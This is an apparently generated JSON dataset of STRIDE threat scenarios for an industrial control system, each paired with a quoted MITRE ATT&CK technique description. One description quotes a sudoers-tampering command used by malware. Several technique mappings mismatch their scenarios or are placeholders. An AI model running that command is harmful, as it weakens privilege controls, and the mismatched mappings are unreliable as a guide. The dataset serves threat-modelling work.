                "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
                "id": "attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0",
                "technique_id": "T1548.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud service misconfiguration exposes data to unauthorized external parties.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service configurations are not regularly reviewed.",
                    "Role": "Cloud Service",
                    "Condition": "Configurations changes are not audited or reviewed."
                },
                {
                    "Assumption": "Attacker knows or can discover misconfigured endpoints.",
                    "Role": "Attacker",
                    "Condition": "The attacker can scan for and identify misconfigurations."
                }
            ],
            "Potential Impact": "Leakage of sensitive operational data, potentially leading to corporate espionage or other malicious activities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud misconfiguration",
                "data exposure",
                "external access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on the Control Center, disrupting command issuance.",
            "Assumptions": [
                {
                    "Assumption": "Control Center lacks proper DDoS mitigation.",
                    "Role": "Control Center",
                    "Condition": "No DDoS protection mechanisms are in place."
                },
                {
                    "Assumption": "The attack can be launched by overwhelming network traffic.",
                    "Role": "Attacker",
                    "Condition": "Attacker has the capability to generate sufficient network traffic."
                }
            ],
            "Potential Impact": "Disruption of control operations, leading to halted production and potential financial loss.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network",
                "Control Center"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infection on field devices causes them to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Field devices lack robust anti-malware protection.",
                    "Role": "Field Devices",
                    "Condition": "No anti-malware mechanisms are deployed on the field devices."
                },
                {
                    "Assumption": "The attack vector can successfully deliver malware to the devices.",
                    "Role": "Attacker",
                    "Condition": "The attacker can exploit a vulnerability to deliver malware."
                }
            ],
            "Potential Impact": "Unavailability of field devices, leading to disruption of industrial processes and potential safety risks.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "field devices",
                "unresponsive"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Ransomware attack on the gateway disrupts data flow to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The gateway lacks adequate ransomware protection.",
                    "Role": "Gateway",
                    "Condition": "No anti-ransomware solutions are in place on the gateway."
                },
                {
                    "Assumption": "The attacker can deliver and execute ransomware on the gateway.",
                    "Role": "Attacker",
                    "Condition": "The attacker can exploit vulnerabilities to install ransomware."
                }
            ],
            "Potential Impact": "Interruption of data transmission and processing, leading to operational delays and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "ransomware",
                "gateway",
                "data flow"
            ],
            "mitre_technique": {
                "name": "Data Encrypted for Impact",
                "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)",
                "id": "attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0",
                "technique_id": "T1486"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the MES to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "MES has unpatched vulnerabilities.",
                    "Role": "MES",
                    "Condition": "Vulnerabilities exist due to outdated software."
                },
                {
                    "Assumption": "The attacker can identify and exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "The attacker can scan for and exploit MES vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized administrative control over MES, allowing malicious changes to production workflows.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "MES",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to escalate privileges from a regular user to an administrator in the cloud service.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service accounts are susceptible to social engineering attacks.",
                    "Role": "Cloud Service Users",
                    "Condition": "Users are vulnerable to phishing or other social engineering tactics."
                },
                {
                    "Assumption": "Proper access control mechanisms are not enforced.",
                    "Role": "Cloud Service",
                    "Condition": "Access controls do not robustly segregate roles and responsibilities."
                }
            ],
            "Potential Impact": "Full control over cloud services, leading to unauthorized data access and unrestricted actions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "social engineering",
                "cloud service",
                "access control"
            ],
            "mitre_technique": {
                "name": "Social Media Accounts",
                "description": "Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",
                "id": "attack-pattern--274770e0-2612-4ccf-a678-ef8e7bad365d",
                "technique_id": "T1586.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised field device is used to propagate malware and gain higher access in the network.",
            "Assumptions": [
                {
                    "Assumption": "Field devices have weak access controls.",
                    "Role": "Field Devices",
                    "Condition": "Field devices can be accessed or reconfigured with minimal security."
                },
                {
                    "Assumption": "Network segmentation is inadequate.",
                    "Role": "Network",
                    "Condition": "Different network segments are not well isolated from each other."
                }
            ],
            "Potential Impact": "Propagation of malware leading to higher-level access, network compromise, and potential control over critical systems.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "malware propagation",
                "field devices",
                "network"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "29",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker impersonates a field device to gain unauthorized access to the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Field devices are not utilizing strong authentication methods.",
                    "Role": "Field Device",
                    "Condition": "True if weak authentication methods are used or not used at all."
                },
                {
                    "Assumption": "Communication between field devices and the Control Center is not adequately encrypted.",
                    "Role": "Network",
                    "Condition": "True if encryption standards are outdated or not implemented."
                },
                {
                    "Assumption": "Attacker has access to network traffic or can physically access a field device.",
                    "Role": "Attacker",
                    "Condition": "True if the physical perimeter is not secure or the network is not protected."
                }
            ],
            "Potential Impact": "Unauthorized control of industrial processes leading to data corruption and potential physical damage.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "impersonation",
                "field device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor masquerades as a legitimate user to access the MES database.",
            "Assumptions": [
                {
                    "Assumption": "User authentication relies on weak methods or credentials are compromised.",
                    "Role": "User",
                    "Condition": "True if passwords are weak or users fall victim to social engineering attacks."
                },
                {
                    "Assumption": "The Control Center does not employ multi-factor authentication (MFA).",
                    "Role": "Control Center",
                    "Condition": "True if MFA is not enforced or implemented."
                },
                {
                    "Assumption": "Access controls do not limit user privileges effectively.",
                    "Role": "Database",
                    "Condition": "True if privilege escalation vulnerabilities are present."
                }
            ],
            "Potential Impact": "Compromise of sensitive operational data, disrupting production workflows and leading to financial loss.",
            "MITRE ATT&CK Keywords": [
                "credentials",
                "user",
                "masquerading",
                "MES database"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Impersonation of a gateway to intercept data between the SCADA system and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication and encryption mechanisms for gateway communications.",
                    "Role": "Gateway",
                    "Condition": "True if communications are not encrypted or encrypted weakly."
                },
                {
                    "Assumption": "Attackers have access to network traffic or gateway authentication credentials.",
                    "Role": "Attacker",
                    "Condition": "True if the network is vulnerable to interception or credentials are compromised."
                },
                {
                    "Assumption": "Proper monitoring of gateway activities is not in place.",
                    "Role": "Security Monitor",
                    "Condition": "True if anomaly detection mechanisms are not implemented."
                }
            ],
            "Potential Impact": "Interception of sensitive data, unauthorized data manipulation, and potential service disruption.",
            "MITRE ATT&CK Keywords": [
                "gateway",
                "network",
                "interception",
                "SCADA"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker modifies control commands sent from the Control Center to field devices.",
            "Assumptions": [
                {
                    "Assumption": "Communications are not encrypted or lack integrity checks.",
                    "Role": "Communication Channel",
                    "Condition": "True if encryption is not used or not properly implemented."
                },
                {
                    "Assumption": "Field devices do not validate the authenticity of received commands.",
                    "Role": "Field Device",
                    "Condition": "True if devices lack mechanisms to verify command origins."
                },
                {
                    "Assumption": "Attacker has the capability to intercept and alter network traffic.",
                    "Role": "Attacker",
                    "Condition": "True if the network lacks adequate security measures."
                }
            ],
            "Potential Impact": "Execution of unintended actions, potentially causing operational disruptions or physical damage.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "commands",
                "network",
                "control center"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Compromise and alteration of sensor data being sent to the RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Sensor data transmission is not properly encrypted or authenticated.",
                    "Role": "Sensor",
                    "Condition": "True if sensors send data without security measures in place."
                },
                {
                    "Assumption": "RTUs lack multi-layer validation for received data.",
                    "Role": "RTU",
                    "Condition": "True if RTUs do not cross-verify data from multiple sources."
                },
                {
                    "Assumption": "Attacker has access to the network through which the data is transmitted.",
                    "Role": "Attacker",
                    "Condition": "True if the network is not secured against unauthorized access."
                }
            ],
            "Potential Impact": "Faulty data reporting, leading to improper operational decisions and potential system failures.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "sensor data",
                "RTU",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Modification of data stored in the MES database by an unauthorized user.",
            "Assumptions": [
                {
                    "Assumption": "Database access controls are weak or improperly configured.",
                    "Role": "Database",
                    "Condition": "True if fine-grained access controls are not in place or misconfigured."
                },
                {
                    "Assumption": "User accounts and privileges are not regularly audited.",
                    "Role": "User Accounts",
                    "Condition": "True if regular security audits are not conducted."
                },
                {
                    "Assumption": "Attacker has obtained credentials of a legitimate user.",
                    "Role": "Attacker",
                    "Condition": "True if credentials are leaked, phished, or otherwise compromised."
                }
            ],
            "Potential Impact": "Corruption of critical operational data, leading to disruption in production workflows and potential financial losses.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database",
                "MES",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs an action in the system but denies their involvement.",
            "Assumptions": [
                {
                    "Assumption": "System logging and auditing mechanisms are not robust.",
                    "Role": "System",
                    "Condition": "True if logging does not capture sufficient details."
                },
                {
                    "Assumption": "Logs can be altered or deleted by an attacker.",
                    "Role": "Logs",
                    "Condition": "True if logs are not protected or tamper-evident."
                },
                {
                    "Assumption": "Lack of non-repudiation controls in the architecture.",
                    "Role": "System",
                    "Condition": "True if non-repudiation measures are not implemented."
                }
            ],
            "Potential Impact": "Inability to trace malicious actions to their source, hampering forensic analysis and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "auditing",
                "non-repudiation"
            ],
